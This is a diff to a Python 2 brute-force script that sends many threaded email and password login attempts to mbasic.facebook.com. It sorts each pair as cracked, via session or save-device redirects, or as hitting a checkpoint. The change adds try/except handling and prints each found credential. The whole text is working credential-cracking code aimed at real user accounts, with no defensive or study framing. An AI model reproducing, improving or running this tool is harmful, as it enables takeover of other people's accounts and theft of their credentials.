@@ -33,23 +33,31 @@ class asuBrute(threading.Thread):
 	def run(self):
 		global initz,_found,_cekpoin
 		initz+=1
-		_req=requests.post(self._urls,
-			data={
+		try:
+			self._req=requests.post(self._urls,
+				data={
 							"email":self._email,
 							"pass":self._pasw,
 							"login":self._submit
 						}
-		).url
-		
-		if "save-device" in _req or "m_sess" in _req:
-			_found.append(" | %s -> %s"%(self._email,
-			self._pasw))
-		if "checkpoint" in _req:
-			_cekpoin.append(" - %s - %s"%(self._email,
-			self._pasw))
-		print "\r[%s*%s] Cracking %s/%s found %s"%(G,N,initz,
-		self._many,len(_found)),;sys.stdout.flush()
+			).url
+			if "save-device" in self._req or "m_sess" in self._req:
+				print "\r[+] Found     : %s -> %s"%(self._email,
+				self._pasw)
+				_found.append(" | %s -> %s"%(self._email,
+				self._pasw))
+			if "checkpoint" in self._req:
+				print "\r[+] Checkpoint: %s -> %s"%(
+				self._email,
+				self._pasw)
+				_cekpoin.append(" - %s - %s"%(self._email,
+				self._pasw))
+			print "\r\r[%s*%s] Cracking %s/%s found: |%s| - ckpoint: |%s|        "%(G,N,initz,
+			self._many,len(_found),
+			len(_cekpoin)),;sys.stdout.flush()
 			
+		except:pass
+
 class _prepares:
 	def __init__(self):
 		self._url = "https://mbasic.facebook.com/login"
@@ -88,16 +96,15 @@ class _prepares:
 			if "login" in _findSubmit["name"]:
 				self._submit = _findSubmit["value"]
 				break
-				
+		toket=[]
 		for _run_ in self.Files:
+			toket.append(_run_)
+		for _run_ in toket:
 			_t=asuBrute(self._url,_run_,self._passwords,
 			len(self.Files),self._submit)
 			threads.append(_t)
 			
 		for _t in threads:
-			tred+=1
-			print("\r[%s+%s] Loding List %s/%s"%(C,N,
-			tred,len(self.Files))),;sys.stdout.flush()
 			_t.start()
 			
 		for _t in threads:
